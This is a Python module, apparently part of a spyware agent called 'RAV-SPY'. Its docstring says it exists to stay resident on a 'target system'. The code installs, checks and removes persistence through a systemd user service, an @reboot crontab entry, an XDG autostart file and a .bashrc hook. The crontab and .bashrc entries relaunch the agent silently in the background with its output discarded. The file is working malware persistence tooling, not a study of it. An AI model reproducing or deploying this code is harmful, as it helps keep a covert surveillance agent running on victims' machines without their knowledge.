"""
Persistence — install/remove/status untuk bertahan di sistem target.
Methods: systemd user, crontab, XDG autostart, bashrc hook.
"""
import os
import shutil
import subprocess
from pathlib import Path
from loguru import logger

PROJECT_DIR = Path(__file__).resolve().parent.parent
SERVICE_NAME = "rav-spy-agent"
SERVICE_SRC = PROJECT_DIR / "deploy" / f"{SERVICE_NAME}.service"
SERVICE_DST = Path.home() / ".config" / "systemd" / "user" / f"{SERVICE_NAME}.service"
AUTOSTART_DIR = Path.home() / ".config" / "autostart"
AUTOSTART_FILE = AUTOSTART_DIR / "rav-spy-agent.desktop"
CRON_LINE = "@reboot cd {} && nohup {}/venv/bin/python -m agent.main > /dev/null 2>&1 &".format(PROJECT_DIR, PROJECT_DIR)
BASHRC_HOOK = "\n# RAV-SPY auto-start (added by persistence)\nnohup {}/venv/bin/python -m agent.main > /dev/null 2>&1 &\n".format(PROJECT_DIR)


def _get_crontab() -> str:
    try:
        res = subprocess.run(["crontab", "-l"], capture_output=True, text=True, timeout=10)
        if res.returncode == 0:
            return res.stdout
    except Exception:
        pass
    return ""


def _set_crontab(content: str):
    p = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    p.communicate(content.encode())
    p.wait()


def _is_deployed() -> dict:
    return {
        "systemd": SERVICE_DST.exists(),
        "crontab": CRON_LINE.strip() in _get_crontab(),
        "autostart": AUTOSTART_FILE.exists(),
        "bashrc": BASHRC_HOOK.strip() in Path.home().joinpath(".bashrc").read_text() if Path.home().joinpath(".bashrc").exists() else False,
    }


def install(method: str = "all") -> str:
    results = []
    methods = ["systemd", "crontab", "autostart", "bashrc"] if method == "all" else [method]

    if "systemd" in methods:
        try:
            SERVICE_DST.parent.mkdir(parents=True, exist_ok=True)
            shutil.copy2(str(SERVICE_SRC), str(SERVICE_DST))
            subprocess.run(["systemctl", "--user", "daemon-reload"], capture_output=True, timeout=10)
            subprocess.run(["systemctl", "--user", "enable", SERVICE_NAME], capture_output=True, timeout=10)
            results.append("systemd: installed")
        except Exception as e:
            results.append(f"systemd: failed ({e})")

    if "crontab" in methods:
        try:
            current = _get_crontab()
            if CRON_LINE.strip() not in current:
                _set_crontab(current.strip() + "\n" + CRON_LINE + "\n")
            results.append("crontab: installed")
        except Exception as e:
            results.append(f"crontab: failed ({e})")

    if "autostart" in methods:
        try:
            AUTOSTART_DIR.mkdir(parents=True, exist_ok=True)
            desktop = f"""[Desktop Entry]
Type=Application
Name=RAV-SPY Agent
Exec={PROJECT_DIR}/venv/bin/python -m agent.main
Terminal=false
X-GNOME-Autostart-enabled=true
"""
            AUTOSTART_FILE.write_text(desktop)
            results.append("autostart: installed")
        except Exception as e:
            results.append(f"autostart: failed ({e})")

    if "bashrc" in methods:
        try:
            bashrc = Path.home() / ".bashrc"
            content = bashrc.read_text() if bashrc.exists() else ""
            if BASHRC_HOOK.strip() not in content:
                bashrc.write_text(content + BASHRC_HOOK)
            results.append("bashrc: installed")
        except Exception as e:
            results.append(f"bashrc: failed ({e})")

    return "Persistence: " + ", ".join(results)


def remove(method: str = "all") -> str:
    results = []
    methods = ["systemd", "crontab", "autostart", "bashrc"] if method == "all" else [method]

    if "systemd" in methods:
        try:
            if SERVICE_DST.exists():
                SERVICE_DST.unlink()
            subprocess.run(["systemctl", "--user", "daemon-reload"], capture_output=True, timeout=10)
            results.append("systemd: removed")
        except Exception as e:
            results.append(f"systemd: failed ({e})")

    if "crontab" in methods:
        try:
            current = _get_crontab()
            cleaned = "\n".join(line for line in current.split("\n") if CRON_LINE.strip() not in line)
            _set_crontab(cleaned.strip() + "\n")
            results.append("crontab: removed")
        except Exception as e:
            results.append(f"crontab: failed ({e})")

    if "autostart" in methods:
        try:
            if AUTOSTART_FILE.exists():
                AUTOSTART_FILE.unlink()
            results.append("autostart: removed")
        except Exception as e:
            results.append(f"autostart: failed ({e})")

    if "bashrc" in methods:
        try:
            bashrc = Path.home() / ".bashrc"
            if bashrc.exists():
                content = bashrc.read_text()
                content = content.replace(BASHRC_HOOK, "")
                bashrc.write_text(content)
            results.append("bashrc: removed")
        except Exception as e:
            results.append(f"bashrc: failed ({e})")

    return "Persistence: " + ", ".join(results)


def status() -> str:
    st = _is_deployed()
    lines = ["Persistence Status:"]
    for k, v in st.items():
        icon = "✅" if v else "❌"
        lines.append(f"  {icon} {k}")
    return "\n".join(lines)
